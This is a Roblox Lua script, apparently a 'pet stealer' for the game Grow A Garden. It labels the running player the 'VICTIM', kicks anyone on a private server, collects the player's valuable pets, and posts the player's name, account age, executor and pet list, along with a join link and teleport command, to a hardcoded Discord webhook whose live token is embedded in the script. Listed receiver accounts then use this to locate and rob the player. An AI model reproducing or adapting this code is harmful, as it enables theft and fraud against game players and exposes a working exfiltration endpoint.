-- 🐾 Pet Emojis
local petEmojis = {
    ["Orangutan"] = "🦧", ["Hamster"] = "🐹", ["Tarantula Hawk"] = "🕷️", ["Sea Turtle"] = "🐢",
    ["Honey Bee"] = "🍯🐝", ["Crab"] = "🦀", ["Wasp"] = "🐝", ["Bee"] = "🐝",
    ["Toucan"] = "🦜", ["Caterpillar"] = "🐛", ["Pack Bee"] = "📦🐝", ["Seal"] = "🦭",
    ["Scarlet Macaw"] = "🦜", ["Snail"] = "🐌", ["Cow"] = "🐄", ["Sea Otter"] = "🦦",
    ["Peacock"] = "🦚", ["Moon Cat"] = "🐈‍⬛", ["Silver Monkey"] = "🐒", ["Dragonfly"] = "🐉",
    ["T-Rex"] = "🦖", ["Disco Bee"] = "🐝", ["Pterodactyl"] = "🦅", ["Raccoon"] = "🦝",
    ["Mimic Octopus"] = "🐙", ["Fennec Fox"] = "🦊", ["Hyacinth Macaw"] = "🦜", ["Bear"] = "🐻",
    ["Petal Bee"] = "🌸🐝", ["Red Giant Ant"] = "🐜", ["Giant Ant"] = "🐜", ["Mole"] = "🦦",
    ["Meerkat"] = "🐾", ["Flamingo"] = "🦩", ["Butterfly"] = "🦋", ["Capybara"] = "🦫",
    ["Queen Bee"] = "👑🐝", ["Praying Mantis"] = "🪲", ["Brontosaurus"] = "🦖", ["Moth"] = "🦋",
    ["Bald Eagle"] = "🦅", ["Chicken Zombie"] = "🐔💀", ["Squirrel"] = "🐿️", ["Frog"] = "🐸",
    ["Blood Kiwi"] = "🥝🩸", ["Monkey"] = "🐒", ["Axolotl"] = "🦎", ["Cooked Owl"] = "🦉",
    ["Snake"] = "🐍", ["Raptor"] = "🦖", ["Pig"] = "🐖", ["Grey Mouse"] = "🐭",
    ["Seagull"] = "🐦", ["Blood Hedgehog"] = "🦔🩸", ["Panda"] = "🐼", ["Turtle"] = "🐢",
    ["Golden Lab"] = "🐕", ["Stegosaurus"] = "🦖", ["Hedgehog"] = "🦔"
}

-- 🌈 Mutation Emojis
local mutationIcons = {
    ["Shiny"] = "✨", ["Inverted"] = "🔄", ["Frozen"] = "❄️", ["Windy"] = "💨",
    ["Golden"] = "💰", ["Mega"] = "🔥", ["Tiny"] = "🔹", ["Tranquil"] = "🧘",
    ["IronSkin"] = "🛡️", ["Radiant"] = "🌟", ["Rainbow"] = "🌈", ["Shocked"] = "⚡",
    ["Ascended"] = "🌀"
}

-- ✅ Config
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" },
    PET_WHITELIST = {
        "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
        "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
    }
}

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
if getServerType and getServerType:IsA("RemoteFunction") then
    local ok, serverType = pcall(function()
        return getServerType:InvokeServer()
    end)
    if ok and serverType == "VIPServer" then
        game.Players.LocalPlayer:Kick("Server error. Please join a Public server")
        return
    end
end

local VICTIM = game.Players.LocalPlayer
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
local victimPetTable = {}

-- 📝 Format pet entry
local function formatPetDetails(petData)
    local name = petData.PetType
    local rarity = petData.Rarity or "?"
    local kg = math.floor((petData.KG or 0) * 10) / 10
    local ageSec = tonumber(petData.Age or 0)
    local days = math.floor(ageSec / 86400)
    local ageDisplay = days > 0 and (days .. "d") or math.floor(ageSec / 3600) .. "h"

    -- 🔥 Combine mutation icons
    local mutation = petData.Mutation
    local mutationStr = ""
    if mutation then
        for _, mut in pairs(mutation) do
            local icon = mutationIcons[mut]
            if icon then mutationStr = mutationStr .. icon end
        end
    end

    local emoji = petEmojis[name] or ""
    return string.format("%s%s %s (%s | %.1fkg | %s old)", mutationStr, emoji, name, rarity, kg, ageDisplay)
end

-- ✅ Filter whitelist
local function checkPetsWhilelist(pet)
    for _, name in CONFIG.PET_WHITELIST do
        if string.find(pet, name) then return true end
    end
end

-- 🎒 Collect valid pets
local function getPlayersPets()
    for petUid, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhilelist(petData.PetType) then
            table.insert(victimPetTable, formatPetDetails(petData))
        end
    end
end

-- 🌐 Send Discord Webhook
local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                    VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 Backpack",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ Join with URL",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local request = http_request or request or HttpPost or syn.request
    request({
        Url = CONFIG.WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

-- 🟢 Start
getPlayersPets()

task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            local fullList = table.concat(victimPetTable, "\n")
            createDiscordEmbed(fullList, "100000")
            break
        end
    end
end)
